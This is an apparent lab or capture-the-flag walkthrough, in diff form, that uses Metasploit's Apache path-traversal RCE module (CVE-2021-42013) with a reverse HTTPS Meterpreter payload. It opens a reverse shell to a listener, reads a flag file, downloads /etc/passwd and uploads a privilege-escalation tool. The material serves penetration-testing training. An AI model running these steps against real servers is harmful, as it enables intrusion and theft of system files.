@@ -1,0 +1,53 @@
+Questions
+Follow the steps from this section and launch the exploit module with the Meterpreter payload payload/linux/x64/meterpreter_reverse_https. Once a session is spawned, use the search command within the Meterpreter command prompt and search for a file named passwords. Display the output of this file to obtain the flag.
+
+msf6 exploit(multi/http/apache_normalize_path_rce) > show payloads
+...
+ 12  payload/linux/x64/meterpreter_reverse_https       .                normal  No     Linux Meterpreter, Reverse HTTPS Inline
+...
+msf6 exploit(multi/http/apache_normalize_path_rce) > set payload 12
+msf6 exploit(multi/http/apache_normalize_path_rce) > show options
+...
+Module options (exploit/multi/http/apache_normalize_path_rce):
+   CVE        CVE-2021-42013   yes       The vulnerability to use (Accepted: CVE-2021-41773, CVE-2021-42013)
+   DEPTH      5                yes       Depth for Path Traversal
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     192.168.217.16   yes       The target host(s), 
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /cgi-bin         yes       Base path
+   VHOST                       no        HTTP server virtual host
+
+Payload options (linux/x64/meterpreter_reverse_https):
+
+   LHOST  192.168.45.166   yes       The local listener hostname
+   LPORT  8443             yes       The local listener port
+   LURI                    no        The HTTP Path
+...
+msf6 exploit(multi/http/apache_normalize_path_rce) > run
+...
+[!] This exploit may require manual cleanup of '/tmp/jwdGgEKS' on the target
+...
+
+meterpreter > search -f passwords
+...
+/opt/passwords  37            2024-05-09 05:09:25 -0400
+...
+meterpreter > cat /opt/passwords
+OS{24aaadc71eda015dcc1e023ee166b340}
+
+# We can do more 
+meterpreter > lpwd
+meterpreter > lcd /home/kali/Downloads
+meterpreter > download /etc/passwd
+meterpreter > lcat /home/kali/Downloads/passwd
+meterpreter > upload /usr/bin/unix-privesc-check /tmp/
+meterpreter > exit
+
+
+
+
+
+
+
+
